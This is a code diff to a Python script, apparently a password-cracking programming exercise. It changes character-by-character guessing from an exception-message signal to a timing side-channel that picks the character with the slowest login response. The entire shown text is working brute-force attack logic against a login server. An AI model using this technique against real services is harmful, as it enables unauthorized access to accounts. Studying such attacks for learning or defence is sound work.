@@ -7,6 +7,7 @@ import inspect
 import requests
 import os
 import json
+from time import time
 
 DEBUG_HACK = True
 
@@ -163,23 +164,26 @@ def get_dict_pass(hostname, port) -> dict:
         password_found = False
         password = ''
         while not password_found:
+            time_series = {}
             for char in string.ascii_letters + string.digits:
                 password_new = password + char
                 if DEBUG_HACK:
                     logging.info(password_new)
                 credentials_json = create_login_json(login=valid_login,
                                                      password=password_new)
+                start_time = time()
                 ans = test_credentials(client_socket,
                                        credentials_json)
-                if ans == "Exception happened during login":
-                    password = password_new
-                    if DEBUG_HACK:
-                        logging.info("password so far: %s", password)
+                time_series[char] = time() - start_time
                 if ans == "Connection success!":
                     password_found = True
                     logging.info("!!Credentials found - exit loop!!: %s", credentials_json)
-                    break
-    return credentials_json
+                    return credentials_json
+            max_key = max(time_series, key=time_series.get)
+            password += max_key
+            if DEBUG_HACK:
+                logging.info("password so far %s", password)
+    return None
 
 
 @logger
